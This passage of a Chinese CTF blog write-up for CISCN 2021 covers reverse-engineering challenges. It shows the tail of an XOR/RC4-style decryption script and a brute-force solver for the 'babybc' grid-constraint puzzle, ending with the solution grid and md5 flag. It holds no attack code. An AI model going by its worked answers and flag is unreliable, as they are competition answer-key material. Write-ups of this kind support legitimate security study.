c[i]=c[i]^<span class="built_in">ord</span>(a[i%<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">3</span>):</span><br><span class="line">    c[<span class="number">3</span>*i+<span class="number">1</span>]=c[<span class="number">3</span>*i+<span class="number">1</span>]^c[<span class="number">3</span>*i]</span><br><span class="line">    c[<span class="number">3</span>*i+<span class="number">2</span>]=c[<span class="number">3</span>*i+<span class="number">1</span>]^c[<span class="number">3</span>*i+<span class="number">2</span>]</span><br><span class="line">    c[<span class="number">3</span>*i]=c[<span class="number">3</span>*i+<span class="number">2</span>]^c[<span class="number">3</span>*i]</span><br><span class="line"></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line">m=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    n=(n+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    g=b[n]</span><br><span class="line">    m=(m+g)%<span class="number">256</span></span><br><span class="line">    b[n]=b[m]</span><br><span class="line">    b[m]=g</span><br><span class="line">    c[i]^=b[(g+b[n])%<span class="number">256</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h2><p>用到 LLVM，再IDA打开</p>
+<p>两个函数，写了各种限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">横</span><br><span class="line">row 0001 1000 2001 0000 1010</span><br><span class="line">map[0][3] &gt; map[0][4]</span><br><span class="line">map[1][0] &gt; map[1][1]</span><br><span class="line">map[2][0] &lt; map[2][1]</span><br><span class="line">map[2][3] &gt; map[2][4]</span><br><span class="line">map[4][0] &gt; map[4][1]</span><br><span class="line">map[4][2] &gt; map[4][3]</span><br><span class="line"></span><br><span class="line">纵</span><br><span class="line">col 00202 00000 00010 01001</span><br><span class="line">map[0][2] &gt; map[1][2]</span><br><span class="line">map[0][4] &gt; map[1][4]</span><br><span class="line">map[2][3] &lt; map[3][3]</span><br><span class="line">map[3][1] &lt; map[4][1]</span><br><span class="line">map[3][4] &lt; map[4][3]</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line">num1 = []</span><br><span class="line">num2 = []</span><br><span class="line">num3 = []</span><br><span class="line">num4 = []</span><br><span class="line">num5 = []</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span>(i2 == i1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span>(i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span>(i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3  <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span>(i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4 <span class="keyword">or</span> i4 &lt;= i5):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num1.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1 <span class="keyword">or</span> i2 &gt;= i1 <span class="keyword">or</span> i2 == <span class="number">5</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num2.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1 <span class="keyword">or</span> i1 &gt;= i2):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 != <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i4 &gt;= <span class="number">3</span> <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4 <span class="keyword">or</span> i5 &gt;= i4):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num3.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i4 != <span class="number">3</span> <span class="keyword">or</span> i4 == <span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num4.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1 <span class="keyword">or</span> i2 &gt;= i1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i3 &lt;= i4 <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4 <span class="keyword">or</span> i5 == <span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num5.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> num1:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> num2:</span><br><span class="line">        <span class="keyword">if</span> (i1[<span class="number">2</span>] &lt;= i2[<span class="number">2</span>] <span class="keyword">or</span> i1[<span class="number">4</span>] &lt;= i2[<span class="number">4</span>]):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> (i2[i] == i1[i]):</span><br><span class="line">                    flag = <span class="number">1</span>                                  </span><br><span class="line">            <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i3 <span class="keyword">in</span> num3:</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i3[i] == i1[i] <span class="keyword">or</span> i3[i] == i2[i]):</span><br><span class="line">                            flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i4 <span class="keyword">in</span> num4:</span><br><span class="line">                            flag = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i4[i] == i1[i] <span class="keyword">or</span> i4[i] == i2[i] <span class="keyword">or</span> i4[i] == i3[i]):</span><br><span class="line">                                    flag = <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">for</span> i5 <span class="keyword">in</span> num5:</span><br><span class="line">                                    <span class="keyword">if</span> (i4[<span class="number">1</span>] &gt;= i5[<span class="number">1</span>] <span class="keyword">or</span> i4[<span class="number">4</span>] &gt;= i5[<span class="number">4</span>]):</span><br><span class="line">                                        <span class="keyword">continue</span></span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        flag = <span class="number">0</span></span><br><span class="line">                                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                                            <span class="keyword">if</span> (i5[i] == i1[i] <span class="keyword">or</span> i5[i] == i2[i] <span class="keyword">or</span> i5[i] == i3[i] <span class="keyword">or</span> i5[i] == i4[i]):</span><br><span class="line">                                                flag = <span class="number">1</span></span><br><span class="line">                                        <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                                            <span class="keyword">continue</span></span><br><span class="line">                                        <span class="built_in">print</span>(<span class="string">&#x27;========================&#x27;</span>)</span><br><span class="line">                                        <span class="built_in">print</span>(i1)</span><br><span class="line">                                        <span class="built_in">print</span>(i2)</span><br><span class="line">                                        <span class="built_in">print</span>(i3)</span><br><span class="line">                                        <span class="built_in">print</span>(i4)</span><br><span class="line">                                        <span class="built_in">print</span>(i5)</span><br><span class="line">                                        <span class="built_in">print</span>(<span class="string">&#x27;========================&#x27;</span>)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p>
+<p>fill_number 会检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map</span><br><span class="line">00000</span><br><span class="line">00000</span><br><span class="line">04400</span><br><span class="line">00030</span><br><span class="line">00010</span><br></pre></td></tr></table></figure>
+
+<p>最后 md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/checksec/" rel="prev" title="checksec">
+      <i class="fa fa-chevron-left"></i> checksec
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/assembly/" rel="next" title="汇编">
+      汇编 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2021"><span class="nav-number">1.</span> <span class="nav-text">CISCN_2021</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">2.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwny"><span class="nav-number">2.1.</span> <span class="nav-text">pwny</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">2.1.1.</span> <span class="nav-text">解题思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81fd-%E7%BD%AE%E9%9B%B6"><span class="nav-number">2.1.2.</span> <span class="nav-text">1、fd 置零</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81leak-libc"><span class="nav-number">2.1.3.</span> <span class="nav-text">2、leak libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E8%AE%A1%E7%AE%97%E6%95%B0%E7%BB%84addr"><span class="nav-number">2.1.4.</span> <span class="nav-text">3、计算数组addr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E4%BF%AE%E6%94%B9hook"><span class="nav-number">2.1.5.</span> <span class="nav-text">4、修改hook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%EF%BC%9A"><span class="nav-number">2.1.6.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#longlywolf"><span class="nav-number">2.2.</span> <span class="nav-text">longlywolf</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">3.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#game"><span class="nav-number">3.1.</span> <span class="nav-text">game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babybc"><span class="nav-number">3.2.</span> <span class="nav-text">babybc</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Trick"
+      src="/images/TRICK-LOGO.gif">
+  <p class="site-author-name" itemprop="name">Trick</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/YTrick" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;YTrick" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1319699069@qq.com" title="E-Mail → mailto:1319699069@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Trick</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">95k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:26</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<!--添加运行时间-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+      Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+      year - 作为date对象的年份，为4位年份值
+      month - 0-11之间的整数，做为date对象的月份
+      day - 1-31之间的整数，做为date对象的天数
+      hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+      minutes - 0-59之间的整数，做为date对象的分钟数
+      seconds - 0-59之间的整数，做为date对象的秒数
+      microseconds - 0-999之间的整数，做为date对象的毫秒数
+     */
+		var t1 = Date.UTC(2020,03,14,18,12,20); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
